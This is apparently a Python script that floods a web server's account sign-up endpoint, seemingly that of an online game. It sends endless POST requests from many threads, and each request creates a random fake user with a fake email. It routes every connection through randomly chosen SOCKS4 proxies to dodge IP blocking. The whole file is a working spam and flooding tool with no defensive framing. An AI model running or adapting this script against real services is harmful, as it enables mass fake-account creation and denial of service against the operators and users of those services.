import sys
import socks
import time
import threading
import string
import random
import ssl

def make_req(): 
 randuser = "".join(random.choice(string.ascii_lowercase) for _ in range(8))
 reqsignup = "strUsername={}&strPassword=asdasd&strEmail={}@gmail.com&strGender=M&ClassID=2&HairID=52&intAge=10&strDOB=6/22/2002&intColorEye=91294&intColorSkin=15388042&intColorHair=6180663".format(randuser, randuser)
 req = "POST /{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\nReferer: https://www.google.com/\r\nAccept: */*\r\nConnection: close\r\nContent-Length: {}\r\n\r\n{}".format(url, host, len(reqsignup), reqsignup)
 return req

def spam_reqs():
 req = make_req()
 print(req)
 s = socks.socksocket()
 proxycurr = random.choice(proxylist).split(":")
 s.setproxy(socks.SOCKS4, proxycurr[0], int(proxycurr[1]))
 s.settimeout(1)
 s.connect((sys.argv[1], int(sys.argv[2])))
 if int(sys.argv[2]) == 443:
  s = ssl.wrap_socket(s)
 s.send(req)
 print(s.recv(1024))
 s.close()

def threads_start(): 
 while True:
  try:
   spam_reqs()
  except Exception as error:
   print(error)

if len(sys.argv) < 7:
 print("<ip> <port> <url> <host> <threads> <proxy list>") 
 sys.exit(0)
url = sys.argv[3]
host = sys.argv[4]
with open(sys.argv[6], "r") as file:
 proxylist=file.read().splitlines()
 file.close()
for i in range(int(sys.argv[5])):
 t = threading.Thread(target=threads_start)
 t.start()
while True:
 pass

